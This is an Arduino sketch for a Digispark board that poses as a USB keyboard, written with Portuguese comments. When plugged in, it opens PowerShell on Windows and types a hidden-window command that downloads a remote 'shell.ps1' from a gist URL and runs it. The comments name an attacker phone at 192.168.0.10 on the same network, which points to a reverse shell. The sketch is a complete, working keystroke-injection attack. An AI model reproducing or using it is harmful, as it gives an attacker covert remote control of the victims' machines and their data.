#include "DigiKeyboardPtBr.h"

void setup() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/higoviana/06d3a28d59f4245d0544f1e8e71a952d/raw/1d511877042d08a25e5c2a257874de6f6f11215d/shell.ps1');\"");
}

void loop() {
  

}

//Esse teste fiz o IP do celular que é 192.168.0.10, no caso o atacante
//Lembrando que tudo isso é na mesma rede
